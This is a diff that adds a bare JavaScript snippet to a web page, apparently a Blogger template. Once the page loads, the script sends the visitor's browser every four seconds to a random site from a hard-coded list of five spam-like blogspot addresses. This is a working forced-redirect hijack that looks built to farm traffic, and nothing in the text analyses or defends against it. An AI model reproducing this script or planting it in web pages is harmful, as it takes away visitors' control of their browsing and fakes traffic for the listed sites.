@@ -1,0 +1,17 @@
+<script type='text/javascript'>
+//<![CDATA[
+(function(){
+setInterval(function(){
+var redSites = [
+  "https://worldtravelandtourism99.blogspot.com/",
+  "https://worldsoccernews99.blogspot.com/",
+  "https://updatemod1fikasi.blogspot.com/",
+  "https://thebesttravelinsurance77.blogspot.com/",
+  "https://bestinspirationqoutes.blogspot.com/"
+];
+var randomLinks = redSites[Math.floor(Math.random()*redSites.length)];
+window.location = randomLinks
+},4000)
+}())
+//]]>
+</script>
